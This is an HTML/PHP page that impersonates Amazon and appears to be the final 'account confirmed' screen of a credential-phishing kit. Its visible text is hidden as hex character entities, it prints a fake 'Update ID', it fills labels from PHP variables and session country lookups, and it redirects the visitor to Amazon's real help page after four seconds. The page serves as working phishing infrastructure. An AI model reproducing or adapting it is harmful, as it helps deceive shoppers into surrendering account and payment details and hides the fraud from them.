                     <form accept-charset='utf-8' action='' class='nav-searchbar' name='site-search' role='search'>
                        <div class="nav-left">
                           <div class='nav-search-scope nav-sprite'>
                              <div class="nav-search-facade" data-value="search-alias=aps">
                                 <span class="nav-search-label">All</span>
                                 <i class="nav-icon"></i>
                              </div>
                           </div>
                        </div>
                        <div class="nav-right">
                           <div class="nav-search-submit nav-sprite">
                              <span id="nav-search-submit-text" class="nav-search-submit-text nav-sprite">Go</span>
                              <input type="submit" 
                                 class="nav-input" 
                                 value="Go" 
                                 tabindex="20" />
                           </div>
                        </div>
                        <div class="nav-fill">
                           <div class="nav-search-field ">
                              <label id="nav-search-label" for="twotabsearchtextbox" class="aok-offscreen"></label>
                              <input type='text' 
                                 id='twotabsearchtextbox' 
                                 value="" 
                                 name='field-keywords' 
                                 autocomplete='off' 
                                 placeholder="" 
                                 class='nav-input' 
                                 dir='auto' tabindex="19">
                           </div>
                           <div id="nav-iss-attach"></div>
                        </div>
                     </form>
                  </div>
               </div>
            </div>
            <div id='nav-main' class='nav-sprite'>
               <div class='nav-left'>
                  <div id='nav-global-location-slot'></div>
               </div>
               <div class='nav-right'>
                  <div id='nav-tools'>
                     <a id="icp-nav-flyout" class="nav-a nav-a-2 icp-link-style-2">
                     <span class="icp-nav-link-inner">
                     <span class="nav-line-1">
                     <span class="icp-nav-globe-img-2"></span>
                     <span class="icp-nav-language">EN</span>
                     </span>
                     <span class="nav-line-2">&nbsp;
                     <span class="nav-icon nav-arrow"></span>
                     </span>
                     </span>
                     <span class="icp-nav-link-border"></span>
                     </a>
                     <a href='#' class='nav-a nav-a-2 nav-truncate' data-nav-ref='nav_ya_signin' data-nav-role='signin' data-ux-jq-mouseenter='true' id='nav-link-accountList' tabindex='61'><span class='nav-line-1'>Hello,</span><span class='nav-line-2'><?=$I_24;?><span class='nav-icon nav-arrow'></span></span><span class='nav-line-3'>Hi</span><span class='nav-line-4'>Account & Lists</span></a>
                     <a
                        href='#' class='nav-a nav-a-2 nav-single-row-link' id='nav-orders' tabindex='63'><span class='nav-line-1'></span><span class='nav-line-2'><?=$I_25;?></span></a><a href='#' class='nav-a nav-a-2 nav-single-row-link' data-ux-jq-mouseenter='true' id='nav-link-prime' tabindex='64'><span class='nav-line-1'></span><span class='nav-line-2'><?=$I_23;?><span class='nav-icon nav-arrow'></span></span></a>
                     <a
                        href='#' aria-label='0 items in cart' class='nav-a nav-a-2' id='nav-cart' tabindex='65'><span aria-hidden='true' class='nav-line-1'></span><span aria-hidden='true' class='nav-line-2'><?=$I_26;?><span class='nav-icon nav-arrow'></span></span><span class='nav-cart-icon nav-sprite'></span><span id='nav-cart-count' aria-hidden='true'
                        class='nav-cart-count nav-cart-0'>0</span></a>
                  </div>
               </div>
               <div class='nav-fill'>
                  <div id='nav-xshop-container' class=''>
                     <div id='nav-xshop'>
                        <a href='#' class='nav-a' data-ux-jq-mouseenter='true' id='nav-recently-viewed' tabindex='48'><?=$I_27;?><span class='nav-icon nav-arrow'></span></a><a href='#' data-nav-tabindex='48' class='nav-a nav_a' id='nav-your-amazon'><span id="nav-your-amazon-text"><span class="nav-shortened-name"></span><?=$I_28;?></span></a>
                        <a
                           href='#' class='nav-a' tabindex='50'><?=$I_29;?></a><a href='#' class='nav-a' tabindex='51'><?=$I_30;?></a><a href='#' class='nav-a' tabindex='52'>&#x52;&#x65;&#x67;&#x69;&#x73;&#x74;&#x72;&#x79;</a><a href='#' class='nav-a' tabindex='53'>&#x53;&#x65;&#x6C;&#x6C;</a><a href='#' class='nav-a' tabindex='54'>&#x54;&#x72;&#x65;&#x61;&#x73;&#x75;&#x72;&#x65;&#x20;&#x54;&#x72;&#x75;&#x63;&#x6B;</a>
                        <a
                           href='#' class='nav-a' tabindex='55'>&#x48;&#x65;&#x6C;&#x70;</a><a href='#' aria-label='Click to call our Disability Customer Support line, or reach us directly at 1-888-283-1678' class='nav-hidden-aria' tabindex='56'><?=$I_31;?> </a>
                     </div>
                  </div>
               </div>
            </div>
            <div id='nav-subnav-toaster'></div>
            <div id='nav-subnav'>
            </div>
         </div>
      </header>
      <style>
         .a-box {
         margin-left: 18px;
         margin-right: 18px;
         }
      </style>
      <br />
      <div class="a-box a-alert a-alert-success">
         <div class="a-box-inner a-alert-container">
            <i class="a-icon a-icon-alert"></i>
            <div class="a-alert-content">
               <div class="a-row">
                  <div class="a-column a-span7">
                     <style type="text/css">
                        .subHeadingAndMobileWidgetDisplay {
                        display: none;
                        margin-top: 0px !important;
                        }
                     </style>
                     <h2 class="a-color-success">
                        &#x54;&#x68;&#x61;&#x6E;&#x6B;&#x20;&#x79;&#x6F;&#x75;&#x2C;
                        &#x59;&#x6F;&#x75;&#x20;&#x68;&#x61;&#x76;&#x65;&#x20;&#x73;&#x75;&#x63;&#x63;&#x65;&#x73;&#x73;&#x66;&#x75;&#x6C;&#x6C;&#x79;&#x20;&#x63;&#x6F;&#x6E;&#x66;&#x69;&#x72;&#x6D;&#x65;&#x64;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x2E;   
                     </h2>
                     <p id="subHeadingAndMobileWidget" class="subHeadingAndMobileWidgetDisplay" style="display: block;">
                        &#x50;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x63;&#x68;&#x65;&#x63;&#x6B;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x66;&#x6F;&#x72;&#x20;&#x66;&#x75;&#x72;&#x74;&#x68;&#x65;&#x72;&#x20;&#x69;&#x6E;&#x73;&#x74;&#x72;&#x75;&#x63;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x64;&#x65;&#x74;&#x61;&#x69;&#x6C;&#x65;&#x64;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x61;&#x62;&#x6F;&#x75;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x75;&#x70;&#x64;&#x61;&#x74;&#x65;&#x2E;&#x20;&#x49;&#x66;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x64;&#x69;&#x64;&#x20;&#x6E;&#x6F;&#x74;&#x20;&#x72;&#x65;&#x67;&#x69;&#x73;&#x74;&#x65;&#x72;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x65;&#x6D;&#x61;&#x69;&#x6C;&#x20;&#x61;&#x64;&#x64;&#x72;&#x65;&#x73;&#x73;&#x2C;&#x20;&#x70;&#x6C;&#x65;&#x61;&#x73;&#x65;&#x20;&#x76;&#x69;&#x73;&#x69;&#x74; <a href="#/gp/message">&#x4D;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x20;&#x43;&#x65;&#x6E;&#x74;&#x65;&#x72;</a> &#x74;&#x6F;&#x20;&#x72;&#x65;&#x76;&#x69;&#x65;&#x77;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x75;&#x70;&#x64;&#x61;&#x74;&#x65;&#x20;&#x6E;&#x6F;&#x74;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x2E;
                        <style type="text/css">
                           .hidden 
                           {
                           display: none;
                           }
                        </style>
                     <div id="txt-trace-typ-widget" style="display:none" ;=""></div>
                     <br>
                     <span id="cs-app-prompt">
                     <span class="a-color-attainable a-text-bold">&#x4E;&#x65;&#x77;&#x21;</span>
                     &#x47;&#x65;&#x74;&#x20;&#x75;&#x70;&#x64;&#x61;&#x74;&#x65;&#x20;&#x6E;&#x6F;&#x74;&#x69;&#x66;&#x69;&#x63;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;&#x20;&#x6F;&#x6E;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x6D;&#x6F;&#x62;&#x69;&#x6C;&#x65;&#x20;&#x64;&#x65;&#x76;&#x69;&#x63;&#x65;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x74;&#x68;&#x65;&#x20;&#x66;&#x72;&#x65;&#x65; <a href="#/typapp">&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x61;&#x70;&#x70;</a>.
                     </span></p>
                     <h5>
                        &#x55;&#x70;&#x64;&#x61;&#x74;&#x65;&#x20;&#x49;&#x44;&#x3A;
                        <span class="a-text-bold">
                        <?php
                           // Generate ID 
                           function UpdateID() { 
                               $s = strtoupper(md5(uniqid(rand(),true))); 
                               $IDText = 
                                   substr($s,0,3) . '-' . 
                                   substr($s,8,7) . '-' . 
                                   substr($s,12,7). '-' . 
                                   substr($s,20); 
                               return $IDText;
                           }
                           // End Generate ID 
                           
                           $ID = UpdateID();
                           echo $ID;
                           
                           ?>
                        </span>
                     </h5>
                     <br />
                     <div class="a-row">
                        <a class="a-link-emphasis" href="#/gp/css/summary/edit.html/ref=typ_rev_edit?ie=UTF8&amp;orderID=111-5512107-1044232">
                        &#x52;&#x65;&#x76;&#x69;&#x65;&#x77;&#x20;&#x6F;&#x72;&#x20;&#x65;&#x64;&#x69;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;
                        </a>
                     </div>
                     <style type="text/css">
                        #rcx-oneclick-divider {
                        margin-top: 5px;
                        }
                        #rcx-toggle-oneclick-success {
                        display: none;
                        }
                        #rcx-toggle-oneclick-success > div {
                        box-shadow: none !important;
                        }
                        #rcx-toggle-oneclick-spinner {
                        visibility: hidden;
                        }
                        .rcx-oneclick-visible-override {
                        visibility: visible !important;
                        }
                     </style>
                     <hr id="rcx-oneclick-divider" class="a-divider-normal">
                     <div id="rcx-oneclick-upsell-section" class="a-section a-spacing-none a-padding-none">
                        <span class="a-declarative" data-action="toggle-oneclick" data-toggle-oneclick="{}" id="rcx-toggle-oneclick-action">
                        <a class="a-align-center a-link-normal" href="#" role="button">
                        &#x54;&#x75;&#x72;&#x6E;&#x20;&#x6F;&#x6E;&#x20;&#x31;&#x2D;&#x43;&#x6C;&#x69;&#x63;&#x6B;&#x20;&#x75;&#x70;&#x64;&#x61;&#x74;&#x65;
                        </a>
                        </span>
                        <span id="rcx-toggle-oneclick-spinner" class="a-spinner a-spinner-small"></span>
                     </div>
                  </div>
               </div>
            </div>
         </div>
      </div>
   </body>
   <style type="text/css">
      .alignCenter {
      text-align: center;
      }
   </style>
   <link rel="stylesheet" href="https://images-na.ssl-images-amazon.com/images/I/61q3B0nT22L._RC|01evdoiemkL.css,01K+Ps1DeEL.css,31Dj+6BjA7L.css,11PuQQlCaSL.css,11UGC+GXOPL.css,21LK7jaicML.css,11L58Qpo0GL.css,21EuGTxgpoL.css,01Xl9KigtzL.css,21GwE3cR-yL.css,019SHZnt8RL.css,01gv-pABIRL.css,11vZhCgAHbL.css,21Mne54CsmL.css,11WgRxUdJRL.css,01dU8+SPlFL.css,11DGn6WmpTL.css,01SHjPML6tL.css,111-D2qRjiL.css,01QrWuRrZ-L.css,31WnKks7R1L.css,114KWZGKCVL.css,01cbS3UK11L.css,21zId9c5Z5L.css,01cNnXK5MbL.css,01fW84gFhxL.css_.css?AUIClients/AmazonUI#us.not-trident">
   <br />  <br />  <br />  <br />
   <div class="a-divider a-divider-section">
      <div class="a-divider-inner"></div>
   </div>
   <div class="a-row a-spacing-large alignCenter">
      <span class="a-button a-spacing-large a-button-primary" id="a-autoid-14"><span class="a-button-inner"><a href="http://www.amazon.com/gp/help/customer/display.html?ie=UTF8" class="a-button-text a-text-center" role="button" id="a-autoid-14-announce">
      Continue shopping
      </a></span></span>
   </div>
   <meta http-equiv="refresh" content="4;url=http://www.amazon.com/gp/help/customer/display.html?ie=UTF8">
    </meta>
   <div id="footer" class="a-section">
      <div class='navLeftFooter nav-sprite-v1' id='navFooter'>
         <a href="#nav-top" id="navBackToTop">
            <div class="navFooterBackToTop"><span class="navFooterBackToTopText">&#x42;&#x61;&#x63;&#x6B;&#x20;&#x74;&#x6F;&#x20;&#x74;&#x6F;&#x70;</span></div>
         </a>
         <div class="navFooterVerticalColumn navAccessibility" role="presentation">
            <div class="navFooterVerticalRow navAccessibility" style="display: table-row;">
               <div class="navFooterLinkCol navAccessibility">
                  <div class="navFooterColHead">&#x47;&#x65;&#x74;&#x20;&#x74;&#x6F;&#x20;&#x4B;&#x6E;&#x6F;&#x77;&#x20;&#x55;&#x73;</div>
                  <ul>
                     <li class='nav_first'><a href='#' class='nav_a'>&#x43;&#x61;&#x72;&#x65;&#x65;&#x72;&#x73;</a></li>
                     <li><a href='#' class='nav_a'>&#x42;&#x6C;&#x6F;&#x67;</a></li>
                     <li><a href='#' class='nav_a'>&#x41;&#x62;&#x6F;&#x75;&#x74;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;</a></li>
                     <li><a href='#' class='nav_a'>&#x49;&#x6E;&#x76;&#x65;&#x73;&#x74;&#x6F;&#x72;&#x20;&#x52;&#x65;&#x6C;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x73;</a></li>
                     <li class='nav_last'><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x44;&#x65;&#x76;&#x69;&#x63;&#x65;&#x73;</a></li>
                  </ul>
               </div>
               <div class="navFooterColSpacerInner navAccessibility"></div>
               <div class="navFooterLinkCol navAccessibility">
                  <div class="navFooterColHead">&#x4D;&#x61;&#x6B;&#x65;&#x20;&#x4D;&#x6F;&#x6E;&#x65;&#x79;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x55;&#x73;</div>
                  <ul>
                     <li class='nav_first'><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x6C;&#x20;&#x6F;&#x6E;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;</a></li>
                     <li><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x6C;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x53;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x73;&#x20;&#x6F;&#x6E;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;</a></li>
                     <li><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x6C;&#x20;&#x6F;&#x6E;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x42;&#x75;&#x73;&#x69;&#x6E;&#x65;&#x73;&#x73;</a></li>
                     <li><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x6C;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x41;&#x70;&#x70;&#x73;&#x20;&#x6F;&#x6E;&#x20;&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;</a></li>
                     <li><a href='#' class='nav_a'>&#x42;&#x65;&#x63;&#x6F;&#x6D;&#x65;&#x20;&#x61;&#x6E;&#x20;&#x41;&#x66;&#x66;&#x69;&#x6C;&#x69;&#x61;&#x74;&#x65;</a></li>
                     <li><a href='#' class='nav_a'>&#x41;&#x64;&#x76;&#x65;&#x72;&#x74;&#x69;&#x73;&#x65;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x50;&#x72;&#x6F;&#x64;&#x75;&#x63;&#x74;&#x73;</a></li>
                     <li><a href='#' class='nav_a'>&#x53;&#x65;&#x6C;&#x66;&#x2D;&#x50;&#x75;&#x62;&#x6C;&#x69;&#x73;&#x68;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x55;&#x73;</a></li>
                     <li class='nav_last nav_a_carat'><span class="nav_a_carat">&rsaquo;</span><a href='#' class='nav_a'>&#x53;&#x65;&#x65;&#x20;&#x61;&#x6C;&#x6C;</a></li>
                  </ul>
               </div>
               <div class="navFooterColSpacerInner navAccessibility"></div>
               <div class="navFooterLinkCol navAccessibility">
                  <div class="navFooterColHead">&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x50;&#x61;&#x79;&#x6D;&#x65;&#x6E;&#x74;&#x20;&#x50;&#x72;&#x6F;&#x64;&#x75;&#x63;&#x74;&#x73;</div>
                  <ul>
                     <li class='nav_first'><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x52;&#x65;&#x77;&#x61;&#x72;&#x64;&#x73;&#x20;&#x56;&#x69;&#x73;&#x61;&#x20;&#x53;&#x69;&#x67;&#x6E;&#x61;&#x74;&#x75;&#x72;&#x65;&#x20;&#x43;&#x61;&#x72;&#x64;&#x73;</a></li>
                     <li><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x2E;&#x63;&#x6F;&#x6D;&#x20;&#x53;&#x74;&#x6F;&#x72;&#x65;&#x20;&#x43;&#x61;&#x72;&#x64;</a></li>
                     <li><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x2E;&#x63;&#x6F;&#x6D;&#x20;&#x43;&#x6F;&#x72;&#x70;&#x6F;&#x72;&#x61;&#x74;&#x65;&#x20;&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x4C;&#x69;&#x6E;&#x65;</a></li>
                     <li><a href='#' class='nav_a'>&#x53;&#x68;&#x6F;&#x70;&#x20;&#x77;&#x69;&#x74;&#x68;&#x20;&#x50;&#x6F;&#x69;&#x6E;&#x74;&#x73;</a></li>
                     <li><a href='#' class='nav_a'>&#x43;&#x72;&#x65;&#x64;&#x69;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x4D;&#x61;&#x72;&#x6B;&#x65;&#x74;&#x70;&#x6C;&#x61;&#x63;&#x65;</a></li>
                     <li><a href='#' class='nav_a'>&#x52;&#x65;&#x6C;&#x6F;&#x61;&#x64;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x42;&#x61;&#x6C;&#x61;&#x6E;&#x63;&#x65;</a></li>
                     <li class='nav_last'><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x43;&#x75;&#x72;&#x72;&#x65;&#x6E;&#x63;&#x79;&#x20;&#x43;&#x6F;&#x6E;&#x76;&#x65;&#x72;&#x74;&#x65;&#x72;</a></li>
                  </ul>
               </div>
               <div class="navFooterColSpacerInner navAccessibility"></div>
               <div class="navFooterLinkCol navAccessibility">
                  <div class="navFooterColHead">&#x4C;&#x65;&#x74;&#x20;&#x55;&#x73;&#x20;&#x48;&#x65;&#x6C;&#x70;&#x20;&#x59;&#x6F;&#x75;</div>
                  <ul>
                     <li class='nav_first'><a href='#' class='nav_a'>&#x59;&#x6F;&#x75;&#x72;&#x20;&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;</a></li>
                     <li><a href='#' class='nav_a'>&#x59;&#x6F;&#x75;&#x72;&#x20;&#x4F;&#x72;&#x64;&#x65;&#x72;&#x73;</a></li>
                     <li><a href='#' class='nav_a'>&#x53;&#x68;&#x69;&#x70;&#x70;&#x69;&#x6E;&#x67;&#x20;&#x52;&#x61;&#x74;&#x65;&#x73;&#x20;&#x26;&#x20;&#x50;&#x6F;&#x6C;&#x69;&#x63;&#x69;&#x65;&#x73;</a></li>
                     <li><a href='#' class='nav_a'>&#x41;&#x6D;&#x61;&#x7A;&#x6F;&#x6E;&#x20;&#x50;&#x72;&#x69;&#x6D;&#x65;</a></li>
                     <li><a href='#' class='nav_a'>&#x52;&#x65;&#x74;&#x75;&#x72;&#x6E;&#x73;&#x20;&#x26;&#x20;&#x52;&#x65;&#x70;&#x6C;&#x61;&#x63;&#x65;&#x6D;&#x65;&#x6E;&#x74;&#x73;</a></li>
                     <li><a href='#' class='nav_a'>&#x4D;&#x61;&#x6E;&#x61;&#x67;&#x65;&#x20;&#x59;&#x6F;&#x75;&#x72;&#x20;&#x43;&#x6F;&#x6E;&#x74;&#x65;&#x6E;&#x74;&#x20;&#x61;&#x6E;&#x64;&#x20;&#x44;&#x65;&#x76;&#x69;&#x63;&#x65;&#x73;</a></li>
                     <li><a href='#' class='nav_a'><?=$I_22;?></a></li>
                     <li class='nav_last'><a href='#' class='nav_a'><?=$I_19;?></a></li>
                  </ul>
               </div>
            </div>
         </div>
         <div class="nav-footer-line"></div>
         <div class="navFooterLine navFooterLinkLine navFooterPadItemLine">
            <span>
               <div class="navFooterLine navFooterLogoLine">
                  <a href="#">
                     <div class="nav-logo-base nav-sprite"></div>
                  </a>
               </div>
            </span>
            <ul></ul>
            <span class="icp-container-desktop">
               <div class="navFooterLine">
                  <style type="text/css">
                     #icp-touch-link-language { display: none; }
                  </style>
                  <a href="#" class="icp-button" id="icp-touch-link-language">
                     <div class="icp-nav-globe-img-2 icp-button-globe-2"></div
                        >
                     <span class="icp-color-base">English</span
                        ><span class="nav-arrow icp-up-down-arrow"></span>
                  </a>
                  <style type="text/css">
                     #icp-touch-link-country { display: none; }
                  </style>
                  <a href="#" class="icp-button" id="icp-touch-link-country">
                  <span class="icp-flag-3 icp-flag-3-<?=$_SESSION['_LOOKUP_CNTRCODE_'];?>"></span
                     ><span class="icp-color-base"><?=$_SESSION['_LOOKUP_COUNTRY_'];?></span>
                  </a>
               </div>
            </span>
            <ul></ul>
         </div>
         <div class="navFooterLine navFooterLinkLine navFooterPadItemLine navFooterCopyright">
            <ul>
               <li class='nav_first'><a href='#' class='nav_a'><?=$I_17;?></a></li>
               <li><a href='#' class='nav_a'><?=$I_18;?></a></li>
               <li><a href='#' class='nav_a'><?=$I_21;?></a></li>
               <li class='nav_last'><?=$I_20;?></li>
            </ul>
         </div>
      </div>
   </div>
</html>